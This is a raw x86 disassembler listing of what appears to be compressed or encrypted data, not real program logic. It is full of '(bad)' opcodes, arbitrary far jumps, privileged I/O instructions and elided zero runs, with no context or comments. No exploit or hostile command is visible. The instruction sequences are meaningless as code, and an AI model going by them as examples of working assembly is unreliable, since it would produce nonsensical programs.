  42a798:	mov    bl,0x9b
  42a79a:	retf   
  42a79b:	lahf   
  42a79c:	or     dl,dh
  42a79e:	or     cl,BYTE PTR [edx]
  42a7a0:	sub    ebx,DWORD PTR [edi-0x4]
  42a7a3:	push   cs
  42a7a4:	mov    esi,0x1e0db23f
  42a7a9:	sbb    esp,DWORD PTR [ecx]
  42a7ab:	pusha  
  42a7ac:	sbb    al,0x53
  42a7ae:	adc    bh,0x47
  42a7b1:	dec    esp
  42a7b2:	sub    DWORD PTR [ecx],eax
  42a7b4:	add    BYTE PTR [bx+si],al
	...
  42a813:	add    BYTE PTR [eax],al
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	and    al,0x3c
  42a824:	cs xor al,0x84
  42a827:	mov    BYTE PTR [ecx],0x0
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [eax-0x31],ch
  42a830:	inc    ecx
  42a831:	not    BYTE PTR [esp+0x47adcae9]
  42a838:	dec    eax
  42a839:	mov    ebp,edx
  42a83b:	inc    ebp
  42a83c:	sbb    eax,0x54c478c0
  42a841:	imul   edi,ebx,0x2a71517f
  42a847:	test   eax,0x12bd332a
  42a84c:	add    DWORD PTR [ebp-0x6],0x43e2b990
  42a853:	push   edx
  42a854:	(bad)  
  42a855:	xchg   esi,eax
  42a856:	mov    cl,0xd2
  42a858:	sub    ebp,ecx
  42a85a:	loop   0x42a800
  42a85c:	or     DWORD PTR [ecx+ebp*1+0x3b],esi
  42a860:	xchg   ebp,eax
  42a861:	mov    ecx,0x4a914f23
  42a866:	jp     0x42a85b
  42a868:	xchg   DWORD PTR [ebx],ecx
  42a86a:	push   esi
  42a86b:	mov    dl,0x96
  42a86d:	ss mov ebp,0xd323f4c7
  42a873:	shl    DWORD PTR [eax+0x6c],cl
  42a876:	push   edx
  42a877:	push   edx
  42a878:	inc    eax
  42a879:	aam    0xd0
  42a87b:	(bad)  
  42a87c:	stos   DWORD PTR es:[edi],eax
  42a87d:	outs   dx,DWORD PTR ds:[esi]
  42a87e:	(bad)  
  42a87f:	xchg   DWORD PTR [edi+0x6f],esp
  42a882:	mov    cl,0xc0
  42a884:	aas    
  42a885:	repz in al,dx
  42a887:	mov    ecx,edi
  42a889:	or     eax,0xb8c9c7d
  42a88e:	outs   dx,BYTE PTR ds:[esi]
  42a88f:	lds    ebx,FWORD PTR [edx+0x78ed29c7]
  42a895:	dec    eax
  42a896:	push   esp
  42a897:	add    ebx,DWORD PTR cs:[ecx]
  42a89a:	iret   
  42a89b:	shl    ah,0xf7
  42a89e:	xchg   edi,eax
  42a89f:	aam    0xeb
  42a8a1:	push   edx
  42a8a2:	jmp    0x42a8a2
  42a8a4:	jae    0x42a900
  42a8a6:	fbld   TBYTE PTR [esi-0x7abdfb23]
  42a8ac:	ss pop ss
  42a8ae:	mov    ecx,DWORD PTR [ebx]
  42a8b0:	mov    edi,0xf6f367f
  42a8b5:	xchg   ebp,ecx
  42a8b7:	mov    DWORD PTR [edx+0x523dcddf],eax
  42a8bd:	pop    edi
  42a8be:	pop    ecx
  42a8bf:	pushf  
  42a8c0:	scas   eax,DWORD PTR es:[edi]
  42a8c1:	inc    ebx
  42a8c2:	cdq    
  42a8c3:	ror    DWORD PTR ds:0x15e70f84,1
  42a8c9:	int3   
  42a8ca:	xor    eax,DWORD PTR [edi+0x4ba3590c]
  42a8d0:	lods   al,BYTE PTR ds:[esi]
  42a8d1:	cmp    DWORD PTR [ebx-0x1910f],eax
  42a8d7:	es push ecx
  42a8d9:	jmp    0x42a93d
  42a8db:	dec    ecx
  42a8dc:	mov    dl,0x47
  42a8de:	push   ss
  42a8df:	daa    
  42a8e0:	in     eax,0x7
  42a8e2:	jmp    0x4bb80943
  42a8e7:	cwde   
  42a8e8:	pop    esi
  42a8e9:	cmp    BYTE PTR [eax],0xa
  42a8ec:	(bad)  
  42a8ed:	les    eax,FWORD PTR [edi+0x264683f0]
  42a8f3:	push   edi
  42a8f4:	sbb    al,0x8
  42a8f6:	jmp    0x7b27:0x193fcff3
  42a8fd:	dec    edi
  42a8fe:	xor    al,0x15
  42a900:	cmp    DWORD PTR [edx],ebp
  42a902:	mov    BYTE PTR [ecx+0x58],ah
  42a905:	scas   eax,DWORD PTR es:[edi]
  42a906:	or     al,0xf8
  42a908:	inc    edi
  42a909:	jbe    0x42a92b
  42a90b:	mov    esp,esp
  42a90d:	mov    dh,0x6f
  42a90f:	lods   eax,DWORD PTR ds:[esi]
  42a910:	cld    
  42a911:	mov    dl,0x74
  42a913:	data16 cld 
  42a915:	jbe    0x42a8f8
  42a917:	lea    ebx,[eax-0x2a]
  42a91a:	fst    QWORD PTR [esi-0xa5a9ad4]
  42a920:	add    al,0x9d
  42a922:	setne  BYTE PTR [ecx+0x1e]
  42a926:	ror    DWORD PTR [eax-0x7d333df4],1
  42a92c:	dec    esi
  42a92d:	lds    edi,FWORD PTR [edx+eax*2]
  42a930:	(bad)  
  42a931:	retf   
  42a932:	cmp    ecx,DWORD PTR [ecx]
  42a934:	or     BYTE PTR [eax],al
	...
  42a996:	test   al,0x93
  42a998:	sbb    eax,0xfbee3fee
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     edi,DWORD PTR [edi]
  42a9a3:	xchg   ebx,eax
  42a9a4:	and    eax,0x1c78bfc
  42a9a9:	add    BYTE PTR [edi],al
  42a9ab:	add    DWORD PTR [eax],eax
  42a9ad:	add    BYTE PTR ds:0xb434963,ah
  42a9b3:	add    esi,DWORD PTR [eax-0x35b651ce]
  42a9b9:	loop   0x42a9c3
  42a9bb:	mov    esi,0x9be5d70d
  42a9c0:	sbb    DWORD PTR [esi+0x73ccb419],esp
  42a9c6:	mov    cl,0x93
  42a9c8:	and    al,0xca
  42a9ca:	pop    edi
  42a9cb:	xchg   ax,ax
  42a9cd:	jbe    0x42a9f9
  42a9cf:	sbb    BYTE PTR [ecx+0x6c7f622c],ch
  42a9d5:	dec    ebx
  42a9d6:	fwait
  42a9d7:	dec    edx
  42a9d8:	jecxz  0x42a998
  42a9da:	push   es
  42a9db:	jne    0x42a96c
  42a9dd:	jmp    0x42a9bb
  42a9df:	(bad)  
  42a9e0:	rcl    BYTE PTR [edx-0x121b12da],0xa8
  42a9e7:	adc    al,0x56
  42a9e9:	cmc    
  42a9ea:	(bad)  
  42a9eb:	push   esp
  42a9ec:	mov    ds:0xf9f29962,eax
  42a9f1:	repnz mov fs,eax
  42a9f4:	xor    DWORD PTR [ebp+edi*8-0x67],ebp
  42a9f8:	popf   
  42a9f9:	inc    ebp
  42a9fa:	mov    al,0xae
  42a9fc:	jnp    0x42aa1b
  42a9fe:	xor    eax,0xc43a7770
  42aa03:	inc    ebp
  42aa04:	mov    ecx,0x162b2bda
  42aa09:	push   ebx
  42aa0a:	sbb    esi,edi
  42aa0c:	lods   al,BYTE PTR ds:[esi]
  42aa0d:	jbe    0x42a9fb
  42aa0f:	fdivr  QWORD PTR [ecx-0x2854a6e2]
  42aa15:	cmp    bh,BYTE PTR [edi]
  42aa17:	jb     0x42a9fe
  42aa19:	mov    al,ds:0x447e458e
  42aa1e:	jge    0x42a9d6
  42aa20:	jo     0x42aa02
  42aa22:	inc    ebx
  42aa23:	jno    0x42a9dc
  42aa25:	cmp    cl,BYTE PTR [eax+0x2ab94822]
  42aa2b:	in     eax,0x93
  42aa2d:	aad    0xc7
  42aa2f:	inc    ecx
  42aa30:	xchg   ebp,eax
  42aa31:	mov    eax,ds:0x2793ecdb
  42aa36:	cmc    
  42aa37:	stos   BYTE PTR es:[edi],al
  42aa38:	(bad)  
  42aa39:	adc    edx,DWORD PTR [ebx]
  42aa3b:	fidiv  WORD PTR [eax+0x56ab49a8]
  42aa41:	cs shl DWORD PTR ds:[edx+edi*1-0x79],0x75
  42aa48:	pushf  
  42aa49:	push   esi
  42aa4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa4b:	or     al,0xe3
  42aa4d:	popa   
  42aa4e:	mov    ch,BYTE PTR [edi]
  42aa50:	in     eax,dx
  42aa51:	cld    
  42aa52:	mov    BYTE PTR [esi+edx*1-0x14eae58c],dh
  42aa59:	dec    ebx
  42aa5a:	mov    bh,0xbe
  42aa5c:	xchg   esi,eax
  42aa5d:	stos   DWORD PTR es:[edi],eax
  42aa5e:	adc    eax,0xbcc40362
  42aa63:	daa    
  42aa64:	mov    BYTE PTR [eax+edi*1],ch
  42aa67:	xchg   edi,eax
  42aa68:	mov    dl,ch
  42aa6a:	retf   0xab31
  42aa6d:	or     DWORD PTR [esi+0x157cb12],ebx
  42aa73:	mov    ch,0xc
  42aa75:	pop    ss
  42aa76:	pop    eax
  42aa77:	cmc    
  42aa78:	cdq    
  42aa79:	pop    ecx
  42aa7a:	add    DWORD PTR ds:0x7cee4c47,ebp
  42aa80:	repnz addr16 xchg esi,eax
  42aa83:	jns    0x42aa90
  42aa85:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa87:	test   BYTE PTR [eax+0x560079],al
  42aa8d:	pop    ss
  42aa8e:	popf   
  42aa8f:	(bad)  
  42aa90:	retf   
  42aa91:	xor    BYTE PTR [edx],cl
  42aa93:	mov    ah,BYTE PTR [eax]
  42aa95:	mov    ebp,0xd7b460f1
  42aa9a:	(bad)  
  42aa9b:	or     esi,DWORD PTR [edi+0x41]
  42aa9e:	mov    esp,0xf9ffaa49
  42aaa3:	ret    0xfd27
  42aaa6:	(bad)  
  42aaa7:	adc    DWORD PTR [ebp-0x6],ecx
  42aaaa:	in     eax,0xb4
  42aaac:	sub    BYTE PTR [esi+0x64],al
  42aaaf:	inc    esp
  42aab0:	out    dx,al
  42aab1:	sbb    eax,0xddce2b
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [edx-0x1f],ebx
  42ab24:	iret   
  42ab25:	cdq    
  42ab26:	xchg   edx,eax
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [esi],bl
  42ab2f:	mov    dh,0xcc
  42ab31:	imul   edx,ebp,0x66
  42ab34:	sbb    BYTE PTR [ebx+0x547a6490],dl
  42ab3a:	add    ebp,DWORD PTR [eax-0x2477242a]
  42ab40:	cmp    ch,dl
  42ab42:	xlat   BYTE PTR ds:[ebx]
  42ab43:	xor    DWORD PTR [ebp-0x6f17c557],0x3d
  42ab4a:	jmp    0x3e88:0xfbbe0ae0
  42ab51:	gs inc ebx
  42ab53:	lea    edx,ds:0xfd178930
  42ab59:	xchg   ebp,eax
  42ab5a:	or     eax,0xdaab5a1e
  42ab5f:	ret    0x558f
  42ab62:	xchg   edi,eax
  42ab63:	inc    esp
  42ab64:	lods   eax,DWORD PTR ds:[esi]
  42ab65:	cmc    
  42ab66:	add    esi,DWORD PTR cs:[ebx-0x7b9c2867]
  42ab6d:	out    0xf5,eax
  42ab6f:	in     eax,0xc6
  42ab71:	xor    al,0xa
  42ab73:	or     al,0x26
  42ab75:	mov    ch,0x75
  42ab77:	out    0xda,al
  42ab79:	(bad)  
  42ab7a:	or     eax,0x999154a3
  42ab7f:	cmp    DWORD PTR [edi-0x65303f36],esp
  42ab85:	xchg   ebp,eax
  42ab86:	rcl    DWORD PTR [ecx+edx*4-0x77143782],1
  42ab8d:	and    BYTE PTR gs:[ecx+0x63343a20],dl
  42ab94:	cdq    
  42ab95:	sbb    al,0x6d
  42ab97:	hlt    
  42ab98:	clc    
  42ab99:	push   ds
  42ab9a:	mov    BYTE PTR [edx-0x40],ch
  42ab9d:	punpckhdq mm7,mm3
  42aba0:	sub    al,BYTE PTR [eax]
  42aba2:	and    eax,0x2c04186d
  42aba7:	pop    eax
  42aba8:	mov    WORD PTR [ebx],?
  42abaa:	adc    BYTE PTR [ebp-0x784c9539],bh
  42abb0:	jle    0x42ab5e
  42abb2:	mov    eax,0xe0ed31a2
  42abb7:	dec    edi
  42abb8:	jecxz  0x42ab3b
  42abba:	jle    0x42ab8f
  42abbc:	add    ah,dh
  42abbe:	mov    esp,ebx
  42abc0:	stos   BYTE PTR es:[edi],al
  42abc1:	adc    ecx,edi
  42abc3:	fcmove st,st(2)
  42abc5:	call   0x20ae4311
  42abca:	sbb    eax,0x465824a2
  42abcf:	int3   
  42abd0:	pop    ebx
  42abd1:	repnz xor al,0x4b
  42abd4:	in     al,0xe6
  42abd6:	cmp    BYTE PTR [eax+esi*4],bh
  42abd9:	int    0xbd
  42abdb:	xor    ah,ch
  42abdd:	or     BYTE PTR [esi+0x68d8aee3],0x5a
  42abe4:	fsub   st,st(5)
  42abe6:	ja     0x42ac64
  42abe8:	mov    cl,0xf9
  42abea:	mov    bl,BYTE PTR [eax]
  42abec:	xlat   BYTE PTR ds:[ebx]
  42abed:	jle    0x42ac57
  42abef:	sbb    al,0xfc
  42abf1:	jmp    0x42ac40
  42abf3:	xor    eax,0xcda8ed4a
  42abf8:	pop    ebx
  42abf9:	adc    dl,BYTE PTR [edi]
  42abfb:	xor    bh,BYTE PTR [ebp+0x2e12b707]
  42ac01:	dec    DWORD PTR [edx+0x2f997cf0]
  42ac07:	pop    esp
  42ac08:	add    al,0xeb
  42ac0a:	xor    al,0xb2
  42ac0c:	push   0xe6ecbb14
  42ac11:	loop   0x42abd5
  42ac13:	inc    ebx
  42ac14:	add    DWORD PTR [eax-0x6c7233d0],edi
  42ac1a:	inc    ebx
  42ac1b:	jle    0x42abf7
  42ac1d:	jo     0x42abb5
  42ac1f:	pushf  
  42ac20:	xor    al,0x2a
  42ac22:	cmp    bl,BYTE PTR [edx]
  42ac24:	mov    esi,0x3f6a4cb8
  42ac29:	sub    dl,BYTE PTR [ecx]
  42ac2b:	repnz into 
  42ac2d:	int3   
  42ac2e:	add    al,0xd8
  42ac30:	dec    ecx
  42ac31:	and    ecx,edx
  42ac33:	std    
  42ac34:	daa    
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x2078f5a7],cl
  42aca4:	shl    DWORD PTR [ebp+0x1c999],0x7
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    dh,ch
  42acaf:	fucomip st,st(2)
  42acb1:	sar    ebx,cl
  42acb3:	xor    dl,bl
  42acb5:	pop    edi
  42acb6:	arpl   bp,dx
  42acb8:	or     ah,BYTE PTR [esi]
  42acba:	call   0xcce0af77
  42acbf:	lds    edi,FWORD PTR [esi-0xd]
  42acc2:	inc    ecx
  42acc3:	pop    ebx
  42acc4:	pop    ebx
  42acc5:	ins    DWORD PTR es:[edi],dx
  42acc6:	fisttp DWORD PTR [bp-0x23d2]
  42accb:	dec    esp
  42accc:	xor    ebp,DWORD PTR [eax+edx*1]
  42accf:	pop    ds
  42acd0:	sbb    al,0x52
  42acd2:	rol    BYTE PTR [edi+0x47],1
  42acd5:	add    al,0x8f
  42acd7:	fcom   QWORD PTR [edi+esi*1]
  42acda:	setb   BYTE PTR [esi+0x6b]
  42acde:	and    al,0xfc
  42ace0:	loope  0x42ac66
  42ace2:	mov    esp,0x7456d50e
  42ace7:	dec    ebx
  42ace8:	out    0xe,eax
  42acea:	dec    esi
  42aceb:	and    eax,0xc7a59e49
  42acf0:	push   ds
  42acf1:	or     eax,0xbaba2e73
  42acf6:	cli    
  42acf7:	xchg   ebp,eax
  42acf8:	mov    bh,BYTE PTR [esi+0x19]
  42acfb:	push   ecx
  42acfc:	add    bl,BYTE PTR [eax+0x776cf8a9]
  42ad02:	cmc    
  42ad03:	mov    ebp,0x3e2a9ccc
  42ad08:	mov    ebx,0xac1ebf0c
  42ad0d:	mov    al,0x83
  42ad0f:	sub    esi,ebx
  42ad11:	sub    DWORD PTR cs:[edx-0x18],ecx
  42ad15:	out    0x30,eax
  42ad17:	mul    BYTE PTR [eax+0xdebd738]
  42ad1d:	hlt    
  42ad1e:	sub    DWORD PTR [ebx+0x15ecf35f],0x4e
  42ad25:	fdiv   DWORD PTR [eax-0x24]
  42ad28:	in     eax,0xfb
  42ad2a:	dec    eax
  42ad2b:	cwde   
  42ad2c:	inc    ebx
  42ad2d:	enter  0xf892,0xb0
  42ad31:	arpl   bx,cx
  42ad33:	add    DWORD PTR [ebp+eax*1-0x2a],esi
  42ad37:	and    ebx,DWORD PTR [ebp+0x13]
  42ad3a:	outs   dx,DWORD PTR ds:[esi]
  42ad3b:	cmp    al,0x6b
  42ad3d:	(bad)  
  42ad3e:	and    ebx,DWORD PTR [edx-0x80]
  42ad41:	sbb    cl,bl
  42ad43:	out    0x97,eax
  42ad45:	xchg   esp,eax
  42ad46:	inc    ebx
  42ad47:	dec    BYTE PTR [ebx-0x2aaa33ce]
  42ad4d:	sar    DWORD PTR [edx+0x2b],cl
  42ad50:	sbb    DWORD PTR [esi-0x64],ebp
  42ad53:	cwde   
  42ad54:	xchg   ecx,eax
  42ad55:	retf   0xd142
  42ad58:	dec    esi
  42ad59:	jne    0x42ace2
  42ad5b:	mov    al,0x96
  42ad5d:	jl     0x42ad48
  42ad5f:	xor    bl,BYTE PTR [ecx]
  42ad61:	outs   dx,DWORD PTR ds:[esi]
  42ad62:	xor    bh,0xad
  42ad65:	mov    edx,0xfb5b44d5
  42ad6a:	mov    DWORD PTR [eiz*8-0x1c3ef23f],ecx
  42ad71:	sub    BYTE PTR [eax-0x2c2f9d61],bh
  42ad77:	dec    ebp
  42ad78:	(bad)  [ecx+0x5c9ab782]
  42ad7e:	aad    0xab
  42ad80:	pop    ecx
  42ad81:	call   0x59d0:0xc6d1f0d0
  42ad88:	adc    esi,edx
  42ad8a:	or     esi,DWORD PTR [esi]
  42ad8c:	fst    st(5)
  42ad8e:	(bad)  
  42ad8f:	mov    dh,ch
  42ad91:	or     DWORD PTR [ebp-0x18],ebx
  42ad94:	sbb    ah,bl
  42ad96:	push   edx
  42ad97:	sub    eax,0xf31269ca
  42ad9c:	and    eax,0xce51c3
  42ada1:	mov    ebx,0xb3d0d227
  42ada6:	sbb    ebx,DWORD PTR [esi-0x6a950f6c]
  42adac:	cmovne edx,DWORD PTR [ecx]
  42adaf:	inc    eax
  42adb0:	mov    eax,ds:0x506bc84f
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [ecx+eax*2-0x5f6f5085]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    BYTE PTR [ebx],cl
  42ae2f:	pusha  
  42ae30:	jns    0x42ae3b
  42ae32:	mov    dl,0x48
  42ae34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae35:	inc    ebp
  42ae36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae37:	lds    esp,FWORD PTR [eax-0x62]
  42ae3a:	in     al,dx
  42ae3b:	cvtpi2ps xmm0,QWORD PTR [ecx-0x18]
  42ae3f:	inc    ebp
  42ae40:	(bad)  
  42ae41:	in     eax,0x4c
  42ae43:	into   
  42ae44:	xchg   esi,eax
  42ae45:	pop    esi
  42ae46:	mov    bh,0x5b
  42ae48:	mov    esp,DWORD PTR [esi-0x11132a71]
  42ae4e:	mov    esi,0x1031fc4c
  42ae53:	mov    al,ds:0x2b248419
  42ae58:	sar    DWORD PTR [eax-0x538d332f],0xe9
  42ae5f:	push   0x5a8ddb91
  42ae64:	mov    al,ds:0xd5c30859
  42ae69:	call   0xcda4c24f
  42ae6e:	add    dl,0x41
  42ae71:	push   esi
  42ae72:	imul   edi,DWORD PTR [esi+edi*4],0xffffffa4
  42ae76:	fld    st(5)
  42ae78:	xor    al,0xeb
  42ae7a:	adc    esp,eax
  42ae7c:	in     al,0x5a
  42ae7e:	sti    
  42ae7f:	and    al,0x51
  42ae81:	inc    edx
  42ae82:	retf   0x3cd0
  42ae85:	pop    es
  42ae86:	(bad)  
  42ae87:	push   ds
  42ae88:	hlt    
  42ae89:	xor    bh,BYTE PTR [esi+0x6e]
  42ae8c:	push   ecx
  42ae8d:	test   bl,al
  42ae8f:	push   eax
  42ae90:	xchg   edi,eax
  42ae91:	gs stc 
  42ae93:	dec    ebp
  42ae94:	fcmovne st,st(5)
  42ae96:	aas    
  42ae97:	scas   eax,DWORD PTR es:[edi]
  42ae98:	dec    esi
  42ae99:	sahf   
  42ae9a:	cmp    DWORD PTR [esp+ebx*8+0x1d73fbf],ebx
  42aea1:	jbe    0x42af00
  42aea3:	jne    0x42ae98
  42aea5:	cmp    eax,0x12b06184
  42aeaa:	jnp    0x42aeeb
  42aeac:	mov    eax,0x4459e1cb
  42aeb1:	pop    edx
  42aeb2:	ficomp DWORD PTR [ebx+0x5923f94e]
  42aeb8:	sub    ecx,0xffffffab
  42aebb:	js     0x42ae41
  42aebd:	in     al,dx
  42aebe:	popa   
  42aebf:	ret    
  42aec0:	test   BYTE PTR [ebx+0x5c9ec1a8],al
  42aec6:	pop    DWORD PTR [ebx-0x5dde07e0]
  42aecc:	fimul  DWORD PTR [edx-0x67]
  42aecf:	sbb    DWORD PTR [ebp+0x3e],0xfa2cf432
  42aed6:	aad    0xb6
  42aed8:	loope  0x42aee4
  42aeda:	dec    DWORD PTR [eax+esi*1-0x37]
  42aede:	adc    al,0x6d
  42aee0:	add    ebp,esi
  42aee2:	popf   
  42aee3:	and    al,0x14
  42aee5:	jbe    0x42af16
  42aee7:	and    bl,dl
  42aee9:	mov    eax,0xb30f46c8
  42aeee:	in     eax,0xe3
  42aef0:	dec    ebx
  42aef1:	in     eax,dx
  42aef2:	xchg   ecx,eax
  42aef3:	lods   al,BYTE PTR ds:[esi]
  42aef4:	sbb    eax,0x11b21d30
  42aef9:	dec    edx
  42aefa:	hlt    
  42aefb:	jge    0x42aee7
  42aefd:	jo     0x42af4b
  42aeff:	aaa    
  42af00:	rcl    BYTE PTR [ebx],0x2c
  42af03:	clc    
  42af04:	dec    esi
  42af05:	xor    edi,DWORD PTR [ebx+0x6b]
  42af08:	add    DWORD PTR ds:0xd1c7c4bd,edx
  42af0e:	iret   
  42af0f:	cvttps2pi mm6,QWORD PTR [edx]
  42af12:	or     al,0xc4
  42af14:	inc    ebx
  42af15:	add    dh,BYTE PTR [eax]
  42af17:	dec    edx
  42af18:	pop    edx
  42af19:	pop    ecx
  42af1a:	enter  0xf008,0xc8
  42af1e:	push   es
  42af1f:	test   BYTE PTR [ecx-0x15],al
  42af22:	mov    esp,0x6f1c359d
  42af27:	push   0x67dce3d4
  42af2c:	adc    eax,DWORD PTR [edx]
  42af2e:	or     BYTE PTR [ebp+0x3],cl
  42af31:	mov    bh,0xf2
  42af33:	xchg   ebp,eax
  42af34:	rol    BYTE PTR [eax],0x0
	...
  42af93:	add    BYTE PTR [eax],al
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp-0x3d455816],0xfffffff6
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [edx],bh
  42afaf:	(bad)  
  42afb0:	mov    ah,bh
  42afb2:	aam    0x61
  42afb4:	sub    BYTE PTR [eax+0x45],0x9b
  42afb8:	enter  0x93bc,0x4d
  42afbc:	xor    ebp,edi
  42afbe:	dec    esp
  42afbf:	iret   
  42afc0:	or     bh,dh
  42afc2:	outs   dx,BYTE PTR ds:[esi]
  42afc3:	xchg   al,ch
  42afc5:	xchg   ecx,eax
  42afc6:	stos   DWORD PTR es:[edi],eax
  42afc7:	test   DWORD PTR [ebp+0x56],eax
  42afca:	shl    DWORD PTR ds:0x4a53c75e,cl
  42afd0:	pop    ebp
  42afd1:	in     al,0xa6
  42afd3:	retf   0x8977
  42afd6:	cs nop
  42afd8:	loopne 0x42b054
  42afda:	or     al,0x2f
  42afdc:	aad    0xb6
  42afde:	add    ch,0xbc
  42afe1:	lock (bad) 
  42afe3:	xchg   ebp,eax
  42afe4:	outs   dx,DWORD PTR ds:[esi]
  42afe5:	add    DWORD PTR [edx],0xd9ef6f49
  42afeb:	adc    al,0xbd
  42afed:	cmp    ebp,eax
  42afef:	jp     0x42aff7
  42aff1:	repz xchg ebx,eax
  42aff3:	jecxz  0x42b00c
  42aff5:	cld    
  42aff6:	cmp    ah,BYTE PTR [eax]
  42aff8:	cli    
  42aff9:	dec    esp
  42affa:	ret    0x4969
  42affd:	push   ecx
  42affe:	lock jge 0x42af9f
  42b001:	out    dx,al
  42b002:	add    BYTE PTR [edx],cl
  42b004:	aam    0xe9
  42b006:	sub    BYTE PTR [esi],ah
  42b008:	out    0xc4,al
  42b00a:	into   
  42b00b:	jmp    0xb5bfc690
  42b010:	mov    ecx,DWORD PTR [eax-0x1bf565b9]
  42b016:	and    ch,bh
  42b018:	fisttp WORD PTR [ebx-0x14]
  42b01b:	jp     0x42b010
  42b01d:	scas   al,BYTE PTR es:[edi]
  42b01e:	jnp    0x42afe9
  42b020:	dec    esi
  42b021:	sub    DWORD PTR [ecx+0x21a974cb],ebp
  42b027:	mov    al,ds:0x520685a9
  42b02c:	fs jae 0x42afb0
  42b02f:	sbb    eax,0x311738bb
  42b034:	sbb    BYTE PTR [edx-0x51],bl
  42b037:	call   0xd82255b6
  42b03c:	sub    al,0x87
  42b03e:	jbe    0x42afdb
  42b040:	out    0x7f,al
  42b042:	jmp    FWORD PTR [ebx]
  42b044:	clc    
  42b045:	bound  ecx,QWORD PTR [ecx-0xa]
  42b048:	cmp    ebx,DWORD PTR [edi]
  42b04a:	mov    ss,WORD PTR [ebx+0x32d947e4]
  42b050:	sbb    BYTE PTR [ecx-0x6b],al
  42b053:	icebp  
  42b054:	lds    eax,FWORD PTR [ebp-0xe]
  42b057:	cmp    bh,dh
  42b059:	inc    ebp
  42b05a:	dec    ebx
  42b05b:	fsubr  st(0),st
  42b05d:	aas    
  42b05e:	dec    eax
  42b05f:	push   ecx
  42b060:	mov    ah,0xf3
  42b062:	push   cs
  42b063:	icebp  
  42b064:	hlt    
  42b065:	adc    dh,BYTE PTR [eax+0x5e]
  42b068:	xchg   edi,eax
  42b06a:	(bad)
  42b06f:	cmp    ah,BYTE PTR [edi]
  42b071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b072:	jmp    0xbd75:0x35a172be
  42b079:	std    
  42b07a:	test   al,0x75
  42b07c:	test   al,0x71
  42b07e:	(bad)  
  42b07f:	lods   eax,DWORD PTR ds:[esi]
  42b080:	test   BYTE PTR [eax],dh
  42b082:	push   esp
  42b083:	into   
  42b084:	xor    BYTE PTR [esi-0x78303d5c],ch
  42b08a:	inc    esp
  42b08b:	mov    ecx,0x899488f2
  42b090:	call   0x1a4b:0xe07c77cc
  42b097:	adc    BYTE PTR [esi+0x5e],dl
  42b09a:	clc    
  42b09b:	mov    bh,0xf9
  42b09d:	dec    esi
  42b09e:	dec    eax
  42b09f:	and    al,0x50
  42b0a1:	rcl    BYTE PTR [eax],0xc6
  42b0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0a5:	jnp    0x42b05e
  42b0a7:	sub    bl,bl
  42b0a9:	js     0x42b036
  42b0ab:	iret   
  42b0ac:	xor    ebx,DWORD PTR [ebx+edx*2+0x22e4a42]
  42b0b3:	or     DWORD PTR [ebx+0x0],ebp
	...
  42b116:	jne    0x42b13d
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x1b0280ad]
  42b124:	outs   dx,DWORD PTR ds:[esi]
  42b125:	data16 scas al,BYTE PTR es:[edi]
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    ah,ch
  42b12f:	cdq    
  42b130:	mov    edx,0x601a8883
  42b135:	pop    edi
  42b136:	xchg   edi,eax
  42b137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b138:	jb     0x42b118
  42b13a:	lock add dl,BYTE PTR [eax+0x48]
  42b13e:	ins    DWORD PTR es:[edi],dx
  42b13f:	shl    DWORD PTR [ebx],1
  42b141:	mov    BYTE PTR [edx],cl
  42b143:	in     eax,dx
  42b144:	jne    0x42b0d8
  42b146:	and    ebx,DWORD PTR [ecx+ecx*8+0x58d52ecc]
  42b14d:	or     eax,0x4a61245c
  42b152:	adc    ebp,ecx
  42b154:	sub    eax,0xc023fd37
  42b159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b15a:	sub    edi,DWORD PTR [edi-0x2]
  42b15d:	stos   BYTE PTR es:[edi],al
  42b15e:	loop   0x42b185
  42b160:	adc    ch,BYTE PTR [edi-0x75]
  42b163:	mov    ds:0x28048eed,al
  42b168:	adc    edx,DWORD PTR [edi-0x6d]
  42b16b:	mov    eax,0xa7dadc30
  42b170:	xchg   esi,eax
  42b171:	(bad)  [ecx+ebp*2+0x7b]
  42b175:	mov    BYTE PTR [edi],bh
  42b177:	mov    bx,0xd961
